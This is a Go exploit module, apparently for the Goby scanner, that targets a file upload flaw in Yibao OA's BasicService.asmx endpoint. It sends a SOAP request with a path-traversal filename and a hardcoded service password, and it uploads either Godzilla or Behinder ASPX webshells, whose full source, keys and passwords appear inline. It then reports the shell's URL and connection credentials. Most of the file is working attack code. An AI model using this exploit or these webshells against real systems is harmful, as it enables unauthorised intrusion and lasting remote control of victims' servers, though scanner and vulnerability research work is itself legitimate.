package exploits

import (
	"errors"
	"encoding/base64"
	"fmt"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Yibao OA /WebService/BasicService.asmx File Upload Vulnerability",
    "Description": "<p>Yibao OA is a comprehensive software platform designed to provide services for the daily office work of enterprises and organizations. It includes various functions such as information management, process management, knowledge management (archives and business management), and collaborative office.</p><p>However, there is a file upload vulnerability in the /WebService/BasicService.asmx file of Yibao OA. Attackers can exploit this vulnerability to gain control of the system.</p>",
    "Product": "Topvision-Yibao-OA",
    "Homepage": "http://www.its365.net/products.aspx/",
    "DisclosureDate": "2024-04-15",
    "PostTime": "2024-04-16",
    "Author": "mayuze@baimaohui.net",
    "FofaQuery": "body=\"$.cookie(\\\"topvision_oaName\" || title=\"欢迎登录易宝OA系统\"",
    "GobyQuery": "body=\"$.cookie(\\\"topvision_oaName\" || title=\"欢迎登录易宝OA系统\"",
    "Level": "3",
    "Impact": "<p>However, there is a file upload vulnerability in the /WebService/BasicService.asmx file of Yibao OA. Attackers can exploit this vulnerability to gain control of the system.</p>",
    "Recommendation": "<p>1. Contact the manufacturer to obtain measures for fixing the vulnerability.</p><p>2. Set up access policies through firewalls and other security devices to allow access only from whitelisted sources.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "webshell",
            "type": "select",
            "value": "godzilla,custom",
            "show": ""
        },
        {
            "name": "filename",
            "type": "input",
            "value": "test123",
            "show": "webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<%@ Page Language=\"C#\"%><%@ Import Namespace=\"System.IO\"%><% Response.Write(\"test123\");File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>",
            "show": "webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.6",
    "Translation": {
        "CN": {
            "Name": "易宝OA /WebService/BasicService.asmx 文件 文件上传漏洞",
            "Product": "顶讯科技-易宝OA系统",
            "Description": "<p>易宝OA是一种专门为企业和机构的日常办公工作提供服务的综合性软件平台，具有信息管理、流程管理&nbsp; 、知识管理（档案和业务管理）、协同办公等多种功能。</p><p>易宝OA /WebService/BasicService.asmx文件存在文件上传漏洞，攻击者通过漏洞可以控制系统。</p>",
            "Recommendation": "<p>1、联系厂商获取修复漏洞措施</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>易宝OA /WebService/BasicService.asmx文件存在文件上传漏洞，攻击者通过漏洞可以控制系统。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Yibao OA /WebService/BasicService.asmx File Upload Vulnerability",
            "Product": "Topvision-Yibao-OA",
            "Description": "<p>Yibao OA is a comprehensive software platform designed to provide services for the daily office work of enterprises and organizations. It includes various functions such as information management, process management, knowledge management (archives and business management), and collaborative office.</p><p>However, there is a file upload vulnerability in the /WebService/BasicService.asmx file of Yibao OA. Attackers can exploit this vulnerability to gain control of the system.</p>",
            "Recommendation": "<p>1. Contact the manufacturer to obtain measures for fixing the vulnerability.</p><p>2. Set up access policies through firewalls and other security devices to allow access only from whitelisted sources.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>However, there is a file upload vulnerability in the /WebService/BasicService.asmx file of Yibao OA. Attackers can exploit this vulnerability to gain control of the system.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10942"
}`

	sendPayload64231asqwesad := func(hostInfo *httpclient.FixUrl, filename, fileContent string) (*httpclient.HttpResponse, error) {
		shellname := filename + ".aspx"
		cfg := httpclient.NewPostRequestConfig(fmt.Sprintf("/WebService/BasicService.asmx"))
		cfg.VerifyTls = false
		cfg.Timeout = 60

		cfg.Header.Store("Content-Type", " text/xml;charset=UTF-8")
		cfg.Data = fmt.Sprintf("<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\r\n   <soapenv:Header/>\r\n   <soapenv:Body>\r\n      <tem:UploadBillFile>\r\n         <!--type: base64Binary-->\r\n        <tem:fs>%s</tem:fs>\r\n        <!--type: string-->\r\n        <tem:FileName>../../manager/%s</tem:FileName>\r\n         <!--type: string-->\r\n        <tem:webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</tem:webservicePassword>\r\n      </tem:UploadBillFile>\r\n   </soapenv:Body>\r\n</soapenv:Envelope>", fileContent, shellname)

		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil,err
		}
		if resp.StatusCode != 200 || len(resp.Utf8Html) == 0 {
			return nil,errors.New("not response")
		}

		checkRequestConfig := httpclient.NewGetRequestConfig("/" + shellname)
		checkRequestConfig.VerifyTls = false
		checkRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, checkRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, singleScanConfig *scanconfig.SingleScanConfig) bool {
			filename := goutils.RandomHexString(16)
			feature := goutils.RandomHexString(16)
			content := "<%@ Page Language=\"C#\"%><%@ Import Namespace=\"System.IO\"%><% Response.Write(\"" + feature + "\");File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>"
			content = base64.StdEncoding.EncodeToString([]byte(content))
			resp, err := sendPayload64231asqwesad(hostInfo, filename, content)
			if err != nil {
				return false
			}
			if !strings.Contains(resp.Utf8Html, feature) {
				return false
			}
			singleScanConfig.VulURL = hostInfo.FixedHostInfo + "/WebService/BasicService.asmx"
			return true
		},
		func(expResult *jsonvul.ExploitResult, singleScanConfig *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			feature := goutils.RandomHexString(16)
			godzillacontent := `<%@ Page Language="C#"%><%try { string key = "3c6e0b8a9c15224a"; string pass = "pass"; string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace("-", ""); byte[] data = System.Convert.FromBase64String(Context.Request[pass]); data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length); if (Context.Session["payload"] == null) { Context.Session["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data }); ; } else { System.IO.MemoryStream outStream = new System.IO.MemoryStream(); object o = ((System.Reflection.Assembly)Context.Session["payload"]).CreateInstance("LY"); o.Equals(Context); o.Equals(outStream); o.Equals(data); o.ToString(); byte[] r = outStream.ToArray(); Context.Response.Write(md5.Substring(0, 16)); Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); Context.Response.Write(md5.Substring(16)); } } catch (System.Exception) { }
			%>`
			godzillacontent = godzillacontent + feature
			//base64编码
			godzillacontent = base64.StdEncoding.EncodeToString([]byte(godzillacontent))

			behindercontent := `<%@ Page Language="C#" %><%@Import Namespace="System.Reflection"%><%Session.Add("k","e45e329feb5d925b"); /*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%>`

			behindercontent = behindercontent + feature
			//base64编码
			behindercontent = base64.StdEncoding.EncodeToString([]byte(behindercontent))

			webshell := goutils.B2S(singleScanConfig.Params["webshell"])
			content := ""
			filename := goutils.RandomHexString(16)
			shellinfo := ""
			switch webshell {
			case "godzilla":
				content = godzillacontent
				shellinfo += "Password: pass 密钥：key 加密器：CSHAP_AES_BASE64\n"
				shellinfo += "Shell tool: Godzilla v4.0.1\n"
				shellinfo += "shell type: aspx"
			case "custom":
				filename = goutils.B2S(singleScanConfig.Params["filename"])
				content = goutils.B2S(singleScanConfig.Params["content"])
				content = content + feature
				content = base64.StdEncoding.EncodeToString([]byte(content))
			default:
				expResult.Output = `未知的利用方式`
				return expResult
			}

			shellname := filename + ".aspx"
			resp, err := sendPayload64231asqwesad(expResult.HostInfo, filename, content)
			if err != nil {
				expResult.Success = false
				expResult.Output = `漏洞利用失败:` + err.Error()
				return expResult
			}

			if !strings.Contains(resp.Utf8Html, feature) {
				expResult.Success = false
				expResult.Output = `文件上传失败`
				return expResult
			}

			expResult.Success = true
			expResult.Output = fmt.Sprintf("WebShell URL: %s\n", expResult.HostInfo.FixedHostInfo+expResult.HostInfo.Path+"/"+shellname)
			expResult.Output += shellinfo
			return expResult
		},
	))
}
